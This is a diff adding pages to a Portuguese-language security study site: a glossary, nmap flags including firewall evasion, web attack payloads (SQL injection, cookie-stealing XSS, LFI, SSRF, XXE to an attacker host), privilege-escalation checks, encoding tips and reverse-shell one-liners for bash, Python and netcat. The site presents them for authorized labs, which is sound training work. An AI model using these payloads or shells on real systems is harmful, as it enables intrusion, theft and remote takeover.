@@ -290,6 +290,18 @@ body.dark .rev-box,body.dark .rev-card{background:var(--page);border-color:var(-
 .cs-table td.cs-mono{font-family:'DM Mono',monospace;color:var(--p500);font-size:.74rem;white-space:nowrap;width:1%}
 .cs-note{font-size:.74rem;color:var(--ink3);line-height:1.5;margin-top:.5rem;padding:.55rem .8rem;background:var(--p50);border-left:2.5px solid var(--p300);border-radius:6px}
 
+/* Labs cards */
+.lab-card{background:white;border:1.5px solid var(--line);border-radius:10px;padding:.7rem .85rem;margin-top:.5rem}
+.lab-head{display:flex;align-items:center;justify-content:space-between;gap:.5rem;margin-bottom:.25rem}
+.lab-name{font-weight:600;color:var(--ink);font-size:.82rem}
+.lab-name a{color:var(--p500);text-decoration:none;border-bottom:1px dashed var(--p200)}
+.lab-name a:hover{border-bottom-style:solid}
+.lab-desc{font-size:.74rem;color:var(--ink3);line-height:1.45}
+.diff-badge{font-family:'DM Mono',monospace;font-size:.58rem;letter-spacing:.08em;text-transform:uppercase;padding:.12rem .45rem;border-radius:20px;white-space:nowrap;font-weight:500}
+.diff-1{background:var(--p50);color:var(--p400);border:1px solid var(--p200)}
+.diff-2{background:var(--p100);color:var(--p500);border:1px solid var(--p300)}
+.diff-3{background:var(--p500);color:white;border:1px solid var(--p500)}
+
 /* Dark mode */
 body.dark{--bg:#1a0d12;--page:#251018;--p50:#2d1820;--p100:#3a1f29;--p200:#4d2a37;--p300:#7a3d54;--p400:#e8739a;--p500:#f4a0bc;--ink:#fde8ee;--ink2:#f4d0dc;--ink3:#c89fb0;--ink4:#8a6878;--line:#3a1f29;--gbg:rgba(253,232,238,.06);--gborder:rgba(253,232,238,.15);--gink:#fde8ee}
 body.dark .gmodal,body.dark .smodal{background:var(--page)}
@@ -368,6 +380,15 @@ body.dark .atk{background:var(--p50)}
   <div class="ni" onclick="go('cs-codes',this)"><span class="cd">CS·</span>Códigos HTTP</div>
   <div class="ni" onclick="go('cs-shortcuts',this)"><span class="cd">CS·</span>Atalhos Terminal</div>
   <div class="ni" onclick="go('cs-regex',this)"><span class="cd">CS·</span>Regex Básico</div>
+  <div class="ni" onclick="go('cs-nmap',this)"><span class="cd">CS·</span>Nmap por Categoria</div>
+  <div class="ni" onclick="go('cs-payloads',this)"><span class="cd">CS·</span>Payloads Comuns</div>
+  <div class="ni" onclick="go('cs-owasp',this)"><span class="cd">CS·</span>OWASP Top 10</div>
+  <div class="ni" onclick="go('cs-privesc',this)"><span class="cd">CS·</span>Privilege Escalation</div>
+  <div class="ni" onclick="go('cs-encoding',this)"><span class="cd">CS·</span>Encoding</div>
+  <div class="ni" onclick="go('cs-revshells',this)"><span class="cd">CS·</span>Reverse Shells</div>
+  <div class="ndiv"></div>
+  <div class="ns">Prática</div>
+  <div class="ni" onclick="go('labs',this)"><span class="cd">LAB·</span>Labs & Prática</div>
 </nav>
 </aside>
 
@@ -1162,6 +1183,9 @@ body.dark .atk{background:var(--p50)}
       <div class="mt"><div class="mt-head"><span class="mt-title"><span class="gloss" onclick="gOpen(&quot;namespaces&quot;, &quot;Isolamento de processos por tipo de recurso &mdash; base dos containers&quot;)">Namespaces</span></span><span class="mt-code">L&middot;25</span></div>
       <div class="mt-def">Isolamento de processos (PID, NET, MNT). Base de containers.</div>
       <div class="mt-rem"><svg class="cherry-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" style="display:inline-block;vertical-align:-2px"><circle cx="9" cy="18" r="4" stroke="currentColor" stroke-width="1.8"/><circle cx="16" cy="19" r="4" stroke="currentColor" stroke-width="1.8"/><path d="M9 14 Q11 7 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M16 15 Q15 9 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M14 5 Q10 3 9 6 Q12 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M14 5 Q18 3 19 6 Q16 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> <span>Escape de container = sair do namespace e enxergar o host inteiro.</span></div></div>
+      <div class="mt"><div class="mt-head"><span class="mt-title">tmux</span><span class="mt-code">L&middot;26</span></div>
+      <div class="mt-def">Multiplexador de terminal. `tmux new -s x`, `Ctrl+b d` desanexa, `tmux attach`. Sessão sobrevive ao SSH cair.</div>
+      <div class="mt-rem"><svg class="cherry-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" style="display:inline-block;vertical-align:-2px"><circle cx="9" cy="18" r="4" stroke="currentColor" stroke-width="1.8"/><circle cx="16" cy="19" r="4" stroke="currentColor" stroke-width="1.8"/><path d="M9 14 Q11 7 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M16 15 Q15 9 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M14 5 Q10 3 9 6 Q12 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M14 5 Q18 3 19 6 Q16 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> <span>Essencial em pentest: rodar scans longos sem perder tudo se a conexão cair.</span></div></div>
   </div></div>
 <div class="block-notes"><div class="bn-label">Minhas anotações sobre este bloco</div><textarea id="notes-l0" placeholder="Escreva suas observações aqui..." oninput="updateNotesStatus('l0')" onchange="saveBlockNotes('l0')"></textarea><div class="bn-status" id="notes-status-l0">Salvo automaticamente</div></div>
 </div>
@@ -1469,6 +1493,15 @@ body.dark .atk{background:var(--p50)}
       <div class="mt"><div class="mt-head"><span class="mt-title"><span class="gloss" onclick="gOpen(&quot;red team&quot;, &quot;Equipe ofensiva que simula atacantes reais&quot;)">Red/Blue/Purple Team</span></span><span class="mt-code">S&middot;23</span></div>
       <div class="mt-def">Red ataca, Blue defende, Purple coordena/treina os dois.</div>
       <div class="mt-rem"><svg class="cherry-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" style="display:inline-block;vertical-align:-2px"><circle cx="9" cy="18" r="4" stroke="currentColor" stroke-width="1.8"/><circle cx="16" cy="19" r="4" stroke="currentColor" stroke-width="1.8"/><path d="M9 14 Q11 7 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M16 15 Q15 9 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M14 5 Q10 3 9 6 Q12 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M14 5 Q18 3 19 6 Q16 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> <span>Sem Purple, Red e Blue viram silos. O valor real est&aacute; em treinar a defesa com ataque real.</span></div></div>
+      <div class="mt"><div class="mt-head"><span class="mt-title">Threat Modeling</span><span class="mt-code">S&middot;24</span></div>
+      <div class="mt-def">Mapear o que pode dar errado antes de construir. Quem ataca, o que protege, por onde entra. STRIDE é o método clássico.</div>
+      <div class="mt-rem"><svg class="cherry-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" style="display:inline-block;vertical-align:-2px"><circle cx="9" cy="18" r="4" stroke="currentColor" stroke-width="1.8"/><circle cx="16" cy="19" r="4" stroke="currentColor" stroke-width="1.8"/><path d="M9 14 Q11 7 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M16 15 Q15 9 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M14 5 Q10 3 9 6 Q12 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M14 5 Q18 3 19 6 Q16 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> <span>Modelar ameaças cedo é muito mais barato que corrigir um breach depois.</span></div></div>
+      <div class="mt"><div class="mt-head"><span class="mt-title">Defense in Depth</span><span class="mt-code">S&middot;25</span></div>
+      <div class="mt-def">Camadas de defesa em vez de uma só barreira. Se uma falha, a próxima ainda segura o atacante.</div>
+      <div class="mt-rem"><svg class="cherry-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" style="display:inline-block;vertical-align:-2px"><circle cx="9" cy="18" r="4" stroke="currentColor" stroke-width="1.8"/><circle cx="16" cy="19" r="4" stroke="currentColor" stroke-width="1.8"/><path d="M9 14 Q11 7 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M16 15 Q15 9 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M14 5 Q10 3 9 6 Q12 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M14 5 Q18 3 19 6 Q16 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> <span>Nenhum controle é perfeito. Camadas dão tempo de detectar e reagir.</span></div></div>
+      <div class="mt"><div class="mt-head"><span class="mt-title">Least Privilege</span><span class="mt-code">S&middot;26</span></div>
+      <div class="mt-def">Cada usuário e processo recebe só o acesso mínimo necessário. Nada de root pra tudo.</div>
+      <div class="mt-rem"><svg class="cherry-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" style="display:inline-block;vertical-align:-2px"><circle cx="9" cy="18" r="4" stroke="currentColor" stroke-width="1.8"/><circle cx="16" cy="19" r="4" stroke="currentColor" stroke-width="1.8"/><path d="M9 14 Q11 7 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M16 15 Q15 9 14 5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/><path d="M14 5 Q10 3 9 6 Q12 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M14 5 Q18 3 19 6 Q16 7 14 5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg> <span>Menos privilégio = menos dano quando uma conta é comprometida.</span></div></div>
   </div></div>
 <div class="block-notes"><div class="bn-label">Minhas anotações sobre este bloco</div><textarea id="notes-s0" placeholder="Escreva suas observações aqui..." oninput="updateNotesStatus('s0')" onchange="saveBlockNotes('s0')"></textarea><div class="bn-status" id="notes-status-s0">Salvo automaticamente</div></div>
 </div>
@@ -2400,6 +2433,317 @@ body.dark .atk{background:var(--p50)}
 <div class="block-notes"><div class="bn-label">Minhas anotações sobre este cheatsheet</div><textarea id="notes-cs-regex" placeholder="Escreva suas observações aqui..." oninput="updateNotesStatus('cs-regex')" onchange="saveBlockNotes('cs-regex')"></textarea><div class="bn-status" id="notes-status-cs-regex">Salvo automaticamente</div></div>
 </div>
 
+<!-- CHEATSHEET: NMAP -->
+<div class="pg" id="pg-cs-nmap">
+<div class="ph"><div class="bc">cherry root quick edition <span>›</span> cheatsheet <span>›</span> nmap</div><div class="pt">Nmap por Categoria</div><div class="ps">Flags essenciais do nmap organizadas por função — do descobrimento ao escape de firewall.</div></div>
+
+<div class="sec"><div class="sl">Descoberta de hosts</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">-sn</td><td>Ping scan — só descobre hosts vivos, sem escanear portas</td></tr>
+<tr><td class="cs-mono">-Pn</td><td>Trata todos os hosts como vivos — pula a fase de ping</td></tr>
+<tr><td class="cs-mono">-PR</td><td>ARP ping — rápido e confiável na rede local</td></tr>
+<tr><td class="cs-mono">-n</td><td>Não resolve DNS — acelera muito o scan</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Tipos de scan</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">-sS</td><td>SYN scan (stealth) — padrão como root, rápido e discreto</td></tr>
+<tr><td class="cs-mono">-sT</td><td>Connect scan — completa o handshake, usado sem privilégio</td></tr>
+<tr><td class="cs-mono">-sU</td><td>UDP scan — lento, mas pega DNS, SNMP, DHCP</td></tr>
+<tr><td class="cs-mono">-sV</td><td>Detecção de versão dos serviços</td></tr>
+<tr><td class="cs-mono">-O</td><td>Detecção de sistema operacional</td></tr>
+<tr><td class="cs-mono">-A</td><td>Agressivo — junta -sV, -O, scripts e traceroute</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Seleção de portas</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">-p 80,443</td><td>Portas específicas separadas por vírgula</td></tr>
+<tr><td class="cs-mono">-p-</td><td>Todas as 65535 portas TCP</td></tr>
+<tr><td class="cs-mono">-p 1-1000</td><td>Faixa de portas</td></tr>
+<tr><td class="cs-mono">-F</td><td>Fast scan — só as 100 portas mais comuns</td></tr>
+<tr><td class="cs-mono">--top-ports 20</td><td>As N portas mais frequentes</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Timing e performance</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">-T0..-T5</td><td>Velocidade — T0 paranoico, T4 rápido, T5 insano</td></tr>
+<tr><td class="cs-mono">--min-rate 1000</td><td>Força no mínimo N pacotes por segundo</td></tr>
+<tr><td class="cs-mono">--max-retries 1</td><td>Limita retransmissões — acelera mas perde precisão</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">NSE (scripts)</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">-sC</td><td>Roda os scripts padrão (categoria default)</td></tr>
+<tr><td class="cs-mono">--script vuln</td><td>Roda scripts de detecção de vulnerabilidades</td></tr>
+<tr><td class="cs-mono">--script smb-*</td><td>Todos os scripts SMB (enum, vulns)</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Saída</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">-oN arq</td><td>Saída normal (legível) em arquivo</td></tr>
+<tr><td class="cs-mono">-oG arq</td><td>Saída grepável — fácil de filtrar com grep</td></tr>
+<tr><td class="cs-mono">-oX arq</td><td>Saída XML — pra importar em outras ferramentas</td></tr>
+<tr><td class="cs-mono">-oA base</td><td>Salva nos três formatos de uma vez</td></tr>
+<tr><td class="cs-mono">-v / -vv</td><td>Aumenta o nível de verbosidade</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Evasão de firewall/IDS</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">-f</td><td>Fragmenta pacotes pra confundir filtros</td></tr>
+<tr><td class="cs-mono">-D RND:10</td><td>Decoys — esconde seu IP entre iscas falsas</td></tr>
+<tr><td class="cs-mono">--source-port 53</td><td>Finge vir de porta confiável (ex.: DNS)</td></tr>
+<tr><td class="cs-mono">--data-length 25</td><td>Adiciona bytes aleatórios ao pacote</td></tr>
+</tbody></table></div>
+
+<div class="cs-note">Receita comum: descoberta rápida com `nmap -sn 10.0.0.0/24`, depois scan profundo com `nmap -sS -sV -p- -T4 -oA alvo IP`.</div>
+<div class="block-notes"><div class="bn-label">Minhas anotações sobre este cheatsheet</div><textarea id="notes-cs-nmap" placeholder="Escreva suas observações aqui..." oninput="updateNotesStatus('cs-nmap')" onchange="saveBlockNotes('cs-nmap')"></textarea><div class="bn-status" id="notes-status-cs-nmap">Salvo automaticamente</div></div>
+</div>
+
+<!-- CHEATSHEET: PAYLOADS -->
+<div class="pg" id="pg-cs-payloads">
+<div class="ph"><div class="bc">cherry root quick edition <span>›</span> cheatsheet <span>›</span> payloads</div><div class="pt">Payloads Comuns</div><div class="ps">Payloads de referência pra teste de vulnerabilidades web — use só em ambientes autorizados.</div></div>
+
+<div class="sec"><div class="sl">SQL Injection</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">' OR '1'='1</td><td>Bypass clássico de login</td></tr>
+<tr><td class="cs-mono">' OR 1=1-- -</td><td>Comenta o resto da query</td></tr>
+<tr><td class="cs-mono">' UNION SELECT null,version()-- -</td><td>Extrai versão via UNION</td></tr>
+<tr><td class="cs-mono">'; WAITFOR DELAY '0:0:5'-- -</td><td>Blind baseado em tempo (MSSQL)</td></tr>
+<tr><td class="cs-mono">' AND SLEEP(5)-- -</td><td>Blind por tempo (MySQL)</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">XSS (Cross-Site Scripting)</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">&lt;script&gt;alert(1)&lt;/script&gt;</td><td>XSS refletido básico</td></tr>
+<tr><td class="cs-mono">&lt;img src=x onerror=alert(1)&gt;</td><td>Dispara via evento de erro</td></tr>
+<tr><td class="cs-mono">&lt;svg/onload=alert(1)&gt;</td><td>Vetor curto sem espaços</td></tr>
+<tr><td class="cs-mono">"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</td><td>Quebra atributo e rouba cookie</td></tr>
+<tr><td class="cs-mono">javascript:alert(1)</td><td>Em href/src de links</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">LFI (Local File Inclusion)</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">../../../../etc/passwd</td><td>Lê usuários no Linux</td></tr>
+<tr><td class="cs-mono">....//....//etc/passwd</td><td>Bypass de filtro que remove ../</td></tr>
+<tr><td class="cs-mono">php://filter/convert.base64-encode/resource=index.php</td><td>Vaza o fonte PHP em base64</td></tr>
+<tr><td class="cs-mono">/var/log/apache2/access.log</td><td>Alvo de LFI to RCE via log poisoning</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Command Injection</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">; id</td><td>Encadeia comando após o legítimo</td></tr>
+<tr><td class="cs-mono">| whoami</td><td>Pipe pra outro comando</td></tr>
+<tr><td class="cs-mono">&amp;&amp; cat /etc/passwd</td><td>Roda se o anterior tiver sucesso</td></tr>
+<tr><td class="cs-mono">`id`</td><td>Substituição de comando com crase</td></tr>
+<tr><td class="cs-mono">$(whoami)</td><td>Substituição de comando moderna</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">SSRF (Server-Side Request Forgery)</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">http://127.0.0.1:80/</td><td>Acessa serviços internos</td></tr>
+<tr><td class="cs-mono">http://169.254.169.254/latest/meta-data/</td><td>Metadados de cloud (AWS)</td></tr>
+<tr><td class="cs-mono">file:///etc/passwd</td><td>Lê arquivo local via SSRF</td></tr>
+<tr><td class="cs-mono">http://localhost@evil.com</td><td>Bypass de validação de host</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Path Traversal</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">../../../../etc/passwd</td><td>Sobe diretórios até a raiz</td></tr>
+<tr><td class="cs-mono">..%2f..%2f..%2fetc%2fpasswd</td><td>Barra URL-encoded</td></tr>
+<tr><td class="cs-mono">..%252f..%252f</td><td>Double encoding pra burlar filtro</td></tr>
+<tr><td class="cs-mono">..\..\..\windows\win.ini</td><td>Travessia no Windows</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">XXE (XML External Entity)</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;]&gt;</td><td>Lê arquivo local via entidade externa</td></tr>
+<tr><td class="cs-mono">&lt;r&gt;&amp;x;&lt;/r&gt;</td><td>Referencia a entidade no corpo</td></tr>
+<tr><td class="cs-mono">&lt;!ENTITY x SYSTEM "http://atacante/"&gt;</td><td>SSRF/exfiltração via entidade</td></tr>
+</tbody></table></div>
+
+<div class="cs-note">Estes payloads são pra estudo e testes autorizados. Use plataformas como PortSwigger Academy e DVWA — nunca em sistemas de terceiros sem permissão escrita.</div>
+<div class="block-notes"><div class="bn-label">Minhas anotações sobre este cheatsheet</div><textarea id="notes-cs-payloads" placeholder="Escreva suas observações aqui..." oninput="updateNotesStatus('cs-payloads')" onchange="saveBlockNotes('cs-payloads')"></textarea><div class="bn-status" id="notes-status-cs-payloads">Salvo automaticamente</div></div>
+</div>
+
+<!-- CHEATSHEET: OWASP TOP 10 -->
+<div class="pg" id="pg-cs-owasp">
+<div class="ph"><div class="bc">cherry root quick edition <span>›</span> cheatsheet <span>›</span> owasp</div><div class="pt">OWASP Top 10 (2021)</div><div class="ps">Os dez riscos mais críticos em aplicações web, segundo a OWASP.</div></div>
+
+<table class="cs-table">
+  <thead><tr><th>Cód</th><th>Risco</th><th>O que é</th></tr></thead>
+  <tbody>
+    <tr><td class="cs-mono">A01</td><td>Broken Access Control</td><td>Usuário acessa o que não deveria — IDOR, escalada de privilégio</td></tr>
+    <tr><td class="cs-mono">A02</td><td>Cryptographic Failures</td><td>Dados sensíveis expostos por cripto fraca ou ausente</td></tr>
+    <tr><td class="cs-mono">A03</td><td>Injection</td><td>SQLi, XSS, command injection — input não tratado vira código</td></tr>
+    <tr><td class="cs-mono">A04</td><td>Insecure Design</td><td>Falha de arquitetura — o problema está no projeto, não no bug</td></tr>
+    <tr><td class="cs-mono">A05</td><td>Security Misconfiguration</td><td>Configs padrão, serviços abertos, mensagens de erro vazando dados</td></tr>
+    <tr><td class="cs-mono">A06</td><td>Vulnerable Components</td><td>Bibliotecas e frameworks desatualizados com vulns conhecidas</td></tr>
+    <tr><td class="cs-mono">A07</td><td>Identification &amp; Auth Failures</td><td>Login fraco, sessões mal geridas, brute force possível</td></tr>
+    <tr><td class="cs-mono">A08</td><td>Software &amp; Data Integrity</td><td>Updates e pipelines sem verificação — supply chain</td></tr>
+    <tr><td class="cs-mono">A09</td><td>Logging &amp; Monitoring Failures</td><td>Sem logs nem alertas — ataques passam despercebidos</td></tr>
+    <tr><td class="cs-mono">A10</td><td>Server-Side Request Forgery</td><td>Servidor é forçado a acessar recursos internos (SSRF)</td></tr>
+  </tbody>
+</table>
+
+<div class="cs-note">A lista muda a cada ciclo. Em 2021 entraram Insecure Design e SSRF; Injection caiu pra A03 mas continua onipresente. Confira a versão atual em owasp.org.</div>
+<div class="block-notes"><div class="bn-label">Minhas anotações sobre este cheatsheet</div><textarea id="notes-cs-owasp" placeholder="Escreva suas observações aqui..." oninput="updateNotesStatus('cs-owasp')" onchange="saveBlockNotes('cs-owasp')"></textarea><div class="bn-status" id="notes-status-cs-owasp">Salvo automaticamente</div></div>
+</div>
+
+<!-- CHEATSHEET: PRIVILEGE ESCALATION -->
+<div class="pg" id="pg-cs-privesc">
+<div class="ph"><div class="bc">cherry root quick edition <span>›</span> cheatsheet <span>›</span> privesc</div><div class="pt">Privilege Escalation</div><div class="ps">Checklist de escalada de privilégio — pontos pra checar depois de um acesso inicial.</div></div>
+
+<div class="sec"><div class="sl">Linux — primeiros passos</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">sudo -l</td><td>Lista o que você pode rodar como root — checagem nº 1</td></tr>
+<tr><td class="cs-mono">id ; groups</td><td>Veja grupos perigosos: docker, lxd, disk, sudo</td></tr>
+<tr><td class="cs-mono">uname -a</td><td>Versão do kernel — procure exploit conhecido</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Linux — vetores comuns</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">find / -perm -4000 2&gt;/dev/null</td><td>Binários SUID — abuse via GTFOBins</td></tr>
+<tr><td class="cs-mono">getcap -r / 2&gt;/dev/null</td><td>Capabilities perigosas (cap_setuid)</td></tr>
+<tr><td class="cs-mono">cat /etc/crontab</td><td>Cron jobs — scripts editáveis rodando como root</td></tr>
+<tr><td class="cs-mono">echo $PATH</td><td>PATH writable + script chamando binário sem caminho absoluto</td></tr>
+<tr><td class="cs-mono">find / -writable -type d 2&gt;/dev/null</td><td>Diretórios graváveis pra plantar arquivos</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Windows — primeiros passos</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">whoami /priv</td><td>Privilégios do token — SeImpersonate = potato attacks</td></tr>
+<tr><td class="cs-mono">whoami /groups</td><td>Grupos atuais — procure Administradores ou grupos privilegiados</td></tr>
+<tr><td class="cs-mono">systeminfo</td><td>Patches instalados — compare com exploits do kernel/Windows</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Windows — vetores comuns</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">Unquoted Service Path</td><td>Caminho de serviço sem aspas + espaço = sequestro do binário</td></tr>
+<tr><td class="cs-mono">AlwaysInstallElevated</td><td>Chave de registro que instala MSI como SYSTEM</td></tr>
+<tr><td class="cs-mono">Token Impersonation</td><td>SeImpersonatePrivilege — JuicyPotato, PrintSpoofer</td></tr>
+<tr><td class="cs-mono">Weak Service Perms</td><td>Serviço cujo binário você pode trocar (sc qc / accesschk)</td></tr>
+</tbody></table></div>
+
+<div class="cs-note">Automatize a enumeração: LinPEAS/linpeas.sh no Linux e winPEAS no Windows. Mas saiba ler a saída — a ferramenta acha, você explora.</div>
+<div class="block-notes"><div class="bn-label">Minhas anotações sobre este cheatsheet</div><textarea id="notes-cs-privesc" placeholder="Escreva suas observações aqui..." oninput="updateNotesStatus('cs-privesc')" onchange="saveBlockNotes('cs-privesc')"></textarea><div class="bn-status" id="notes-status-cs-privesc">Salvo automaticamente</div></div>
+</div>
+
+<!-- CHEATSHEET: ENCODING -->
+<div class="pg" id="pg-cs-encoding">
+<div class="ph"><div class="bc">cherry root quick edition <span>›</span> cheatsheet <span>›</span> encoding</div><div class="pt">Encoding & Codificação</div><div class="ps">Codificações que aparecem o tempo todo em CTFs, web e análise — como reconhecer e converter.</div></div>
+
+<div class="sec"><div class="sl">Base64</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">echo -n texto | base64</td><td>Codifica em Base64</td></tr>
+<tr><td class="cs-mono">echo dGV4dG8= | base64 -d</td><td>Decodifica Base64</td></tr>
+<tr><td class="cs-mono">A-Z a-z 0-9 + / =</td><td>Alfabeto — termina em "=" de padding (sinal claro)</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">URL encoding</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">%20</td><td>Espaço</td></tr>
+<tr><td class="cs-mono">%2f</td><td>Barra /</td></tr>
+<tr><td class="cs-mono">%3c %3e</td><td>Sinais de menor/maior (&lt; e &gt;)</td></tr>
+<tr><td class="cs-mono">%2527</td><td>Double encoding de aspas — bypass de filtro</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Hexadecimal</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">echo -n A | xxd -p</td><td>Texto em hex (A vira 41)</td></tr>
+<tr><td class="cs-mono">echo 41 | xxd -r -p</td><td>Hex de volta pra texto</td></tr>
+<tr><td class="cs-mono">0x</td><td>Prefixo comum indicando valor hexadecimal</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">HTML entities</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">&amp;lt; &amp;gt;</td><td>Representam &lt; e &gt; (evitam XSS)</td></tr>
+<tr><td class="cs-mono">&amp;amp;</td><td>Representa o &amp;</td></tr>
+<tr><td class="cs-mono">&amp;#65;</td><td>Entidade numérica decimal (A)</td></tr>
+<tr><td class="cs-mono">&amp;#x41;</td><td>Entidade numérica hexadecimal (A)</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">ROT13 / César</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">tr 'A-Za-z' 'N-ZA-Mn-za-m'</td><td>Aplica ROT13 (cifra de César de 13)</td></tr>
+<tr><td class="cs-mono">ROT13(ROT13(x))=x</td><td>Aplicar duas vezes volta ao original</td></tr>
+</tbody></table></div>
+
+<div class="cs-note">Pra converter rápido sem decorar comando, use o CyberChef (gchq.github.io/CyberChef) — encadeia operações de encoding, cripto e parsing num "recipe" visual.</div>
+<div class="block-notes"><div class="bn-label">Minhas anotações sobre este cheatsheet</div><textarea id="notes-cs-encoding" placeholder="Escreva suas observações aqui..." oninput="updateNotesStatus('cs-encoding')" onchange="saveBlockNotes('cs-encoding')"></textarea><div class="bn-status" id="notes-status-cs-encoding">Salvo automaticamente</div></div>
+</div>
+
+<!-- CHEATSHEET: REVERSE SHELLS -->
+<div class="pg" id="pg-cs-revshells">
+<div class="ph"><div class="bc">cherry root quick edition <span>›</span> cheatsheet <span>›</span> revshells</div><div class="pt">Reverse Shells</div><div class="ps">One-liners de shell reverso — troque ATACANTE e PORTA pelos seus. Só em labs autorizados.</div></div>
+
+<div class="sec"><div class="sl">Listener (no seu atacante)</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">nc -lvnp 4444</td><td>Abre listener netcat na porta 4444</td></tr>
+<tr><td class="cs-mono">rlwrap nc -lvnp 4444</td><td>Listener com histórico/edição de linha</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Bash</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">bash -i &gt;&amp; /dev/tcp/ATACANTE/4444 0&gt;&amp;1</td><td>Shell reverso bash puro</td></tr>
+<tr><td class="cs-mono">sh -i &gt;&amp; /dev/tcp/ATACANTE/4444 0&gt;&amp;1</td><td>Variante com sh quando bash não tem</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Python</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATACANTE",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'</td><td>Shell reverso com PTY (Python 3)</td></tr>
+</tbody></table></div>
+
+<div class="sec"><div class="sl">Netcat</div>
+<table class="cs-table"><tbody>
+<tr><td class="cs-mono">nc ATACANTE 4444 -e /bin/bash</td><td>Quando o nc tem a flag -e</td></tr>
+<tr><td class="cs-mono">mkfifo /tmp/f;nc ATACANTE 4444 0&lt;/tmp/f|/bin/sh&gt;/tmp/f 2&gt;&amp;1;rm /tmp/f</td><td>Sem -e, usando FIFO</td></tr>
+</tbody></table></div>
